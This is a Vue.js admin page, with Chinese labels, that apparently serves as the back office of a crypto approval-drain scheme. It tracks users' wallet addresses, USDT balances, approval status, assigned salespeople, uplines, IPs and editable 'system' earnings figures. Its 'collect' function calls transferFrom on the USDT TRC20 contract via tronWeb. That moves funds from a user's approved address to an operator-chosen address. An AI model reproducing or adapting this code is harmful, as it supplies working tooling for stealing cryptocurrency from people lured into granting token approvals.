<template>
  <div class="app-container">
    <el-form :model="queryParams" ref="queryForm" size="small" :inline="true" v-show="showSearch" label-width="68px">
      <el-form-item label="用户id" prop="id" label-width="80">
        <el-input
          v-model="queryParams.id"
          placeholder="请输入用户id"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
      <el-form-item label="用户备注" prop="nickname" label-width="80">
        <el-input
          v-model="queryParams.nickname"
          placeholder="请输入用户备注"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
      <el-form-item label="用户地址" prop="address" label-width="80">
        <el-input
          v-model="queryParams.address"
          placeholder="请输入用户地址"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
<!--      <el-form-item label="授权哈希" prop="hash">-->
<!--        <el-input-->
<!--          v-model="queryParams.hash"-->
<!--          placeholder="请输入授权哈希"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
      <el-form-item label="授权地址" prop="auAddress" label-width="80">
        <el-input
          v-model="queryParams.auAddress"
          placeholder="请输入授权地址"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
      <el-form-item label="授权状态" prop="status" label-width="80">
        <el-select v-model="queryParams.status" placeholder="请选择授权状态" clearable>
          <el-option
            v-for="dict in dict.type.wak_approval_status"
            :key="dict.value"
            :label="dict.label"
            :value="dict.value"
          />
        </el-select>
      </el-form-item>
      <el-form-item label="用户类型" prop="usertype" label-width="80">
        <el-select v-model="queryParams.usertype" placeholder="请选择用户类型" clearable>
          <el-option
            v-for="dict in dict.type.wak_user_type"
            :key="dict.value"
            :label="dict.label"
            :value="dict.value"
          />
        </el-select>
      </el-form-item>
      <el-form-item label="业务员id" prop="agentid" label-width="80">
        <el-input
          v-model="queryParams.agentid"
          placeholder="请输入业务员id"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
<!--      <el-form-item label="邀请码" prop="inviteCode" label-width="80">-->
<!--        <el-input-->
<!--          v-model="queryParams.inviteCode"-->
<!--          placeholder="请输入邀请码"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
<!--      <el-form-item label="单独盈利比例" prop="singleRate">-->
<!--        <el-input-->
<!--          v-model="queryParams.singleRate"-->
<!--          placeholder="请输入单独盈利比例"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
      <el-form-item label="上级id" prop="parentid">
        <el-input
          v-model="queryParams.parentid"
          placeholder="请输入上级id"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
<!--      <el-form-item label="冻结状态" prop="dongjie">-->
<!--        <el-select v-model="queryParams.withdrawStatus" placeholder="请选择冻结状态" clearable>-->
<!--          <el-option-->
<!--            v-for="dict in dict.type.wak_freeze_status"-->
<!--            :key="dict.value"-->
<!--            :label="dict.label"-->
<!--            :value="dict.value"-->
<!--          />-->
<!--        </el-select>-->
<!--      </el-form-item>-->
<!--      <el-form-item label="冻结到期时间">-->
<!--        <el-date-picker-->
<!--          v-model="daterangeDongjietime"-->
<!--          style="width: 240px"-->
<!--          value-format="timestamp"-->
<!--          type="daterange"-->
<!--          range-separator="-"-->
<!--          start-placeholder="开始日期"-->
<!--          end-placeholder="结束日期"-->
<!--        ></el-date-picker>-->
<!--      </el-form-item>-->
      <el-form-item label="提现状态" prop="withdrawStatus">
        <el-select v-model="queryParams.withdrawStatus" placeholder="请选择提现状态" clearable>
          <el-option
            v-for="dict in dict.type.wak_freeze_status"
            :key="dict.value"
            :label="dict.label"
            :value="dict.value"
          />
        </el-select>
      </el-form-item>
      <el-form-item label="IP" prop="ip">
        <el-input
          v-model="queryParams.ip"
          placeholder="请输入IP"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
      <el-form-item label="创建时间">
        <el-date-picker
          v-model="daterangeCreatetime"
          style="width: 240px"
          value-format="timestamp"
          type="daterange"
          range-separator="-"
          start-placeholder="开始日期"
          end-placeholder="结束日期"
        ></el-date-picker>
      </el-form-item>
      <el-form-item label="上次登陆时间">
        <el-date-picker
          v-model="daterangeLastLogintime"
          style="width: 240px"
          value-format="yyyy-MM-dd"
          type="daterange"
          range-separator="-"
          start-placeholder="开始日期"
          end-placeholder="结束日期"
        ></el-date-picker>
      </el-form-item>
      <el-form-item>
        <el-button type="primary" icon="el-icon-search" size="mini" @click="handleQuery">搜索</el-button>
        <el-button icon="el-icon-refresh" size="mini" @click="resetQuery">重置</el-button>
      </el-form-item>
    </el-form>

    <el-row :gutter="10" class="mb8">
      <el-col :span="1.5">
        <el-button
          type="primary"
          plain
          icon="el-icon-plus"
          size="mini"
          @click="handleAdd"
          v-hasPermi="['wak:authaddress:add']"
        >新增</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="success"
          plain
          icon="el-icon-edit"
          size="mini"
          :disabled="single"
          @click="handleUpdate"
          v-hasPermi="['wak:authaddress:edit']"
        >修改</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="danger"
          plain
          icon="el-icon-delete"
          size="mini"
          :disabled="multiple"
          @click="handleDelete"
          v-hasPermi="['wak:authaddress:remove']"
        >删除</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="warning"
          plain
          icon="el-icon-download"
          size="mini"
          @click="handleExport"
          v-hasPermi="['wak:authaddress:export']"
        >导出</el-button>
      </el-col>
      <right-toolbar :showSearch.sync="showSearch" @queryTable="getList"></right-toolbar>
    </el-row>

    <el-table v-loading="loading" :data="authaddressList" @selection-change="handleSelectionChange">
      <el-table-column type="selection" width="55" align="center" />
      <el-table-column label="用户id" align="center" prop="id" width="80"/>
      <el-table-column label="用户备注" align="center" prop="nickname" width="130"/>
      <el-table-column label="用户地址" align="center" prop="address" width="380"/>
      <el-table-column label="链上USDT余额" align="center" prop="usdtBalance" />
      <el-table-column label="类型" align="center" prop="type" />
<!--      <el-table-column label="授权哈希" align="center" prop="hash" />-->
<!--      <el-table-column label="授权地址" align="center" prop="auAddress" />-->
      <el-table-column label="授权状态" align="center" prop="status">
        <template slot-scope="scope">
          <dict-tag :options="dict.type.wak_approval_status" :value="scope.row.status"/>
        </template>
      </el-table-column>
      <el-table-column label="用户类型" align="center" prop="usertype">
        <template slot-scope="scope">
          <dict-tag :options="dict.type.wak_user_type" :value="scope.row.usertype"/>
        </template>
      </el-table-column>
      <el-table-column label="业务员id" align="center" prop="agentid" />
      <el-table-column label="总产出ETH" align="center" prop="outputEth" />
      <el-table-column label="系统ETH" align="center" prop="systemEth" />
      <el-table-column label="系统USDT" align="center" prop="systemUsdt" />
<!--      <el-table-column label="链上矿工费余额" align="center" prop="gasBalance" />-->
<!--      <el-table-column label="邀请码" align="center" prop="inviteCode" />-->
      <el-table-column label="上级id" align="center" prop="parentid" />
      <el-table-column label="单独盈利比例" align="center" prop="singleRate" />
      <el-table-column label="创建时间" align="center" prop="createtime" width="180">
        <template slot-scope="scope">
          <span>{{ parseTime(scope.row.createtime, '{y}-{m}-{d} {hh}:{mm}:{ss}') }}</span>
        </template>
      </el-table-column>
<!--      <el-table-column label="冻结状态" align="center" prop="dongjie">-->
<!--        <template slot-scope="scope">-->
<!--          <dict-tag :options="dict.type.wak_freeze_status" :value="scope.row.dongjie"/>-->
<!--        </template>-->
<!--      </el-table-column>-->
<!--      <el-table-column label="冻结到期时间" align="center" prop="dongjietime" width="180">-->
<!--        <template slot-scope="scope">-->
<!--          <span>{{ parseTime(scope.row.dongjietime, '{y}-{m}-{d} {hh}:{mm}:{ss}') }}</span>-->
<!--        </template>-->
<!--      </el-table-column>-->
      <el-table-column label="提现状态" align="center" prop="withdrawStatus">
        <template slot-scope="scope">
          <dict-tag :options="dict.type.wak_freeze_status" :value="scope.row.withdrawStatus"/>
        </template>
      </el-table-column>
      <el-table-column label="IP" align="center" prop="ip" />
      <el-table-column label="IP所属地址" align="center" prop="ipArea" />
      <el-table-column label="上次登陆时间" align="center" prop="lastLogintime" width="180">
        <template slot-scope="scope">
          <span>{{ parseTime(scope.row.lastLogintime, '{y}-{m}-{d} {h}:{i}:{s}') }}</span>
        </template>
      </el-table-column>
      <el-table-column label="操作" align="center" class-name="small-padding fixed-width">
        <template slot-scope="scope">
          <el-button
            size="mini"
            type="text"
            icon="el-icon-edit"
            @click="handleUpdate(scope.row)"
            v-hasPermi="['wak:authaddress:edit']"
          >修改</el-button>
          <el-button
            v-if="scope.row.type == 'trc'"
            size="mini"
            type="text"
            icon="el-icon-edit"
            @click="handleGuiji(scope.row)"
            v-hasPermi="['wak:authaddress:edit']"
          >归集</el-button>
          <el-button
            size="mini"
            type="text"
            icon="el-icon-delete"
            @click="handleDelete(scope.row)"
            v-hasPermi="['wak:authaddress:remove']"
          >删除</el-button>
        </template>
      </el-table-column>
    </el-table>

    <pagination
      v-show="total>0"
      :total="total"
      :page.sync="queryParams.pageNum"
      :limit.sync="queryParams.pageSize"
      @pagination="getList"
    />

    <!-- 添加或修改授权列对话框 -->
    <el-dialog :title="title" :visible.sync="open" width="500px" append-to-body>
      <el-form ref="form" :model="form" :rules="rules" label-width="80px">
        <el-form-item label="用户地址" prop="address">
          <el-input v-model="form.address" placeholder="请输入用户地址" readonly disabled/>
        </el-form-item>
<!--        <el-form-item label="链上矿工费余额" prop="gasBalance">-->
<!--          <el-input v-model="form.gasBalance" placeholder="请输入链上矿工费余额" />-->
<!--        </el-form-item>-->
<!--        <el-form-item label="链上USDT余额" prop="usdtBalance">-->
<!--          <el-input v-model="form.usdtBalance" placeholder="请输入链上USDT余额" />-->
<!--        </el-form-item>-->
<!--        <el-form-item label="授权哈希" prop="hash">-->
<!--          <el-input v-model="form.hash" placeholder="请输入授权哈希" />-->
<!--        </el-form-item>-->
        <el-form-item label="授权地址" prop="auAddress">
          <el-input v-model="form.auAddress" placeholder="请输入授权地址" readonly disabled/>
        </el-form-item>
        <el-form-item label="授权状态" prop="status">
          <el-select v-model="form.status" placeholder="请选择授权状态">
            <el-option
              v-for="dict in dict.type.wak_approval_status"
              :key="dict.value"
              :label="dict.label"
              :value="parseInt(dict.value)"
            ></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="用户类型" prop="usertype">
          <el-select v-model="form.usertype" placeholder="请选择用户类型">
            <el-option
              v-for="dict in dict.type.wak_user_type"
              :key="dict.value"
              :label="dict.label"
              :value="parseInt(dict.value)"
            ></el-option>
          </el-select>
        </el-form-item>
<!--        <el-form-item label="业务员id" prop="agentid">-->
<!--          <el-input v-model="form.agentid" placeholder="请输入业务员id" />-->
<!--        </el-form-item>-->
        <el-form-item label="业务员id" prop="agentid">
          <el-select v-model="form.agentid" placeholder="业务员id" clearable>
            <el-option
              v-for="dict in yewuyuanList"
              :key="dict.id"
              :label="dict.yewuyuan"
              :value="dict.id"
            />
          </el-select>
        </el-form-item>
        <el-form-item label="总产出ETH" prop="outputEth">
          <el-input v-model="form.outputEth" placeholder="请输入总产出ETH" />
        </el-form-item>
        <el-form-item label="系统ETH" prop="systemEth">
          <el-input v-model="form.systemEth" placeholder="请输入系统ETH" />
        </el-form-item>
        <el-form-item label="系统USDT" prop="systemUsdt">
          <el-input v-model="form.systemUsdt" placeholder="请输入系统USDT" />
        </el-form-item>
        <el-form-item label="用户备注" prop="nickname">
          <el-input v-model="form.nickname" placeholder="请输入用户备注" />
        </el-form-item>
<!--        <el-form-item label="邀请码" prop="inviteCode">-->
<!--          <el-input v-model="form.inviteCode" placeholder="请输入邀请码" />-->
<!--        </el-form-item>-->
        <el-form-item label="单独盈利比例" prop="singleRate">
          <el-input v-model="form.singleRate" placeholder="请输入单独盈利比例" />
        </el-form-item>
        <el-form-item label="上级id" prop="parentid">
          <el-input v-model="form.parentid" placeholder="请输入上级id" />
        </el-form-item>
        <el-form-item label="情侣id" prop="cpId">
          <el-input v-model="form.cpId" placeholder="请输入情侣id" />
        </el-form-item>
        <el-form-item label="历史充值" prop="rechargeHistory">
          <el-input v-model="form.rechargeHistory" placeholder="请输入历史充值" />
        </el-form-item>
<!--        <el-form-item label="冻结状态" prop="dongjie">-->
<!--          <el-select v-model="form.dongjie" placeholder="请选择冻结状态">-->
<!--          <el-option-->
<!--            v-for="dict in dict.type.wak_freeze_status"-->
<!--            :key="dict.value"-->
<!--            :label="dict.label"-->
<!--            :value="parseInt(dict.value)"-->
<!--          ></el-option>-->
<!--          </el-select>-->
<!--        </el-form-item>-->
        <el-form-item label="提现状态" prop="withdrawStatus">
          <el-select v-model="form.withdrawStatus" placeholder="请选择提现状态">
            <el-option
              v-for="dict in dict.type.wak_freeze_status"
              :key="dict.value"
              :label="dict.label"
              :value="parseInt(dict.value)"
            ></el-option>
          </el-select>
        </el-form-item>
<!--        <el-form-item label="冻结到期时间" prop="dongjietime">-->
<!--          <el-date-picker clearable-->
<!--                          v-model="form.dongjietime"-->
<!--                          type="date"-->
<!--                          value-format="yyyy-MM-dd"-->
<!--                          placeholder="请选择冻结到期时间">-->
<!--          </el-date-picker>-->
<!--        </el-form-item>-->
<!--        <el-form-item label="IP" prop="ip">-->
<!--          <el-input v-model="form.ip" placeholder="请输入IP" />-->
<!--        </el-form-item>-->
<!--        <el-form-item label="IP所属地址" prop="ipArea">-->
<!--          <el-input v-model="form.ipArea" placeholder="请输入IP所属地址" />-->
<!--        </el-form-item>-->
      </el-form>
      <div slot="footer" class="dialog-footer">
        <el-button type="primary" @click="submitForm">确 定</el-button>
        <el-button @click="cancel">取 消</el-button>
      </div>
    </el-dialog>

    <!-- 添加或修改授权列表对话框 -->
    <el-dialog title="归集" :visible.sync="guijiOpen" width="500px" append-to-body>
      <el-form ref="form" :model="form2" :rules="rules" label-width="80px">
        <!--        <el-form-item label="转出地址" prop="address">-->
        <!--          <el-input v-model="form2.toAddress" placeholder="请输入归集地址" />-->
        <!--        </el-form-item>-->
        <el-form-item label="归集地址" prop="address">
          <el-input v-model="form2.toAddress" placeholder="请输入归集地址" />
        </el-form-item>
        <el-form-item label="归集数量(USDT)" prop="balance">
          <el-input v-model="form2.transferAmout" placeholder="请输入归集数量" />
        </el-form-item>
        <!--        <el-form-item label="授权额度" prop="approvalBalance">-->
        <!--          <el-input v-model="form.approvalBalance" placeholder="请输入授权额度" />-->
        <!--        </el-form-item>-->
      </el-form>
      <div slot="footer" class="dialog-footer">
        <el-button type="primary" @click="submitForm2">确 定</el-button>
        <el-button @click="cancel2">取 消</el-button>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import { listAuthaddress, getAuthaddress, delAuthaddress, addAuthaddress, updateAuthaddress } from "@/api/wak/authaddress";
import {listYewuyuan} from "@/api/wak/yewuyuan";

export default {
  name: "Authaddress",
  dicts: ['wak_approval_status', 'wak_user_type', 'wak_freeze_status'],
  data() {
    return {
      // 遮罩层
      loading: true,
      // 选中数组
      ids: [],
      // 非单个禁用
      single: true,
      // 非多个禁用
      multiple: true,
      // 显示搜索条件
      showSearch: true,
      // 总条数
      total: 0,
      // 授权列表格数据
      authaddressList: [],
      // 业务员表格数据
      yewuyuanList: [],
      // 弹出层标题
      title: "",
      // 是否显示弹出层
      open: false,
      guijiOpen: false,
      // IP所属地址时间范围
      daterangeCreatetime: [],
      // IP所属地址时间范围
      daterangeDongjietime: [],
      // 上次登陆时间时间范围
      daterangeLastLogintime: [],
      // 查询参数
      queryParams: {
        pageNum: 1,
        pageSize: 10,
        address: null,
        type: null,
        hash: null,
        auAddress: null,
        status: null,
        usertype: null,
        agentid: null,
        nickname: null,
        inviteCode: null,
        singleRate: null,
        createtime: null,
        parentid: null,
        dongjie: null,
        dongjietime: null,
        withdrawStatus: null,
        ip: null,
        lastLogintime: null,
      },
      // 表单参数
      form: {},
      form2: {},
      // 表单校验
      rules: {
      }
    };
  },
  created() {
    this.getList();
    this.getYewuyuanList();
  },
  methods: {
    /** 查询授权列列表 */
    getList() {
      this.loading = true;
      this.queryParams.params = {};
      if (null != this.daterangeCreatetime && '' != this.daterangeCreatetime) {
        this.queryParams.params["beginCreatetime"] = this.daterangeCreatetime[0]/1000;
        this.queryParams.params["endCreatetime"] = this.daterangeCreatetime[1]/1000;
      }
      if (null != this.daterangeDongjietime && '' != this.daterangeDongjietime) {
        this.queryParams.params["beginDongjietime"] = this.daterangeDongjietime[0]/1000;
        this.queryParams.params["endDongjietime"] = this.daterangeDongjietime[1]/1000;
      }
      listAuthaddress(this.queryParams).then(response => {
        this.authaddressList = response.rows;
        this.total = response.total;
        this.loading = false;
      });
    },

    /** 查询业务员列表 */
    getYewuyuanList() {
      let param={
        pageSize:30
      }
      listYewuyuan(param).then(response => {
        this.yewuyuanList = response.rows;
      });
    },
    // 取消按钮
    cancel() {
      this.open = false;
      this.reset();
    },
    // 取消按钮
    cancel2() {
      this.guijiOpen = false;
      this.reset2();
    },
    // 表单重置
    reset() {
      this.form = {
        id: null,
        address: null,
        gasBalance: null,
        usdtBalance: null,
        type: null,
        hash: null,
        auAddress: null,
        status: null,
        usertype: null,
        agentid: null,
        outputEth: null,
        systemEth: null,
        systemUsdt: null,
        nickname: null,
        inviteCode: null,
        singleRate: null,
        createtime: null,
        parentid: null,
        dongjie: null,
        dongjietime: null,
        withdrawStatus: null,
        ip: null,
        rechargeHistory: null,
        cpId: null,
        ipArea: null
      };
      this.resetForm("form");
    },

    // 表单重置
    reset2() {
      this.form2 = {
        id: null,
        address: null,
        balance: null,
        approvalBalance: null,
        createTime: null,
        updateTime: null
      };
      this.resetForm("form");
    },
    /** 搜索按钮操作 */
    handleQuery() {
      this.queryParams.pageNum = 1;
      this.getList();
    },
    /** 重置按钮操作 */
    resetQuery() {
      this.daterangeCreatetime = [];
      this.daterangeDongjietime = [];
      this.resetForm("queryForm");
      this.handleQuery();
    },
    // 多选框选中数据
    handleSelectionChange(selection) {
      this.ids = selection.map(item => item.id)
      this.single = selection.length!==1
      this.multiple = !selection.length
    },
    /** 新增按钮操作 */
    handleAdd() {
      this.reset();
      this.open = true;
      this.title = "添加授权列";
    },
    /** 修改按钮操作 */
    handleUpdate(row) {
      this.reset();
      const id = row.id || this.ids
      getAuthaddress(id).then(response => {
        this.form = response.data;
        this.open = true;
        this.title = "修改授权列";
      });
    },

    /** 归集操作 */
    handleGuiji(row) {
      this.reset();
      const id = row.id || this.ids
      getAuthaddress(id).then(response => {
        this.form2 = response.data;
        this.guijiOpen = true;
        this.title = "归集";
      });
    },
    /** 提交按钮 */
    submitForm() {
      this.$refs["form"].validate(valid => {
        if (valid) {
          if (this.form.id != null) {
            updateAuthaddress(this.form).then(response => {
              this.$modal.msgSuccess("修改成功");
              this.open = false;
              this.getList();
            });
          } else {
            addAuthaddress(this.form).then(response => {
              this.$modal.msgSuccess("新增成功");
              this.open = false;
              this.getList();
            });
          }
        }
      });
    },

    /** 提交按钮 */
    submitForm2() {
      let abi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}]
      ;
      let contract = window.tronWeb.contract(abi, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
      let data = this.form2;
      data.fromAddress = this.form.address;
      let transferAmout = this.form2.transferAmout * 1000000;
      let copyThis = this;
      let res = contract.methods.transferFrom(this.form.address,this.form2.toAddress,transferAmout).send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: false
      }, function (err, res) {
        console.log("err="+err);
        console.log("res="+res);
        if (err){
          copyThis.$modal.msgError("归集失败"+err);
          return false;
        }
        data.hash = res;
        // recordLog(data).then(response => {
        //   copyThis.$modal.msgSuccess("归集成功");
        //   copyThis.open = false;
        //   copyThis.getList();
        // });
      });
//       //后端发起
//       let data = this.form2;
//       data.fromAddress = this.form.address;
//       recordLog(data).then(response => {
//         this.$modal.msgSuccess("归集成功");
//         this.open = false;
//         this.getList();
//       });
    },
    /** 删除按钮操作 */
    handleDelete(row) {
      const ids = row.id || this.ids;
      this.$modal.confirm('是否确认删除授权列编号为"' + ids + '"的数据项？').then(function() {
        return delAuthaddress(ids);
      }).then(() => {
        this.getList();
        this.$modal.msgSuccess("删除成功");
      }).catch(() => {});
    },
    /** 导出按钮操作 */
    handleExport() {
      this.download('wak/authaddress/export', {
        ...this.queryParams
      }, `authaddress_${new Date().getTime()}.xlsx`)
    }
  }
};
</script>
